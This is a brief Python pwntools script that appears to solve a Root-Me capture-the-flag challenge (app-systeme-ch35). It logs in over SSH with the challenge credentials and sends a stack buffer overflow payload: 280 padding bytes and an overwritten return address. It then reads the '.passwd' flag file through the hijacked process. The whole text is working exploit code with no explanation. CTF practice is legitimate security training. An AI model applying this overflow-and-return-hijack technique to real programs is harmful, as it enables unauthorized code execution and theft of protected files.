from pwn import *
p = ssh(host='challenge03.root-me.org' ,user='app-systeme-ch35' ,password='app-systeme-ch35',port=2223)
s=p.process(executable='./ch35')
s.sendline('i'*280+'\xcd\x06\x40\x00\x00\x00\x00\x00')
s.recvline()
s.sendline('cat .passwd')
print s.recvline()
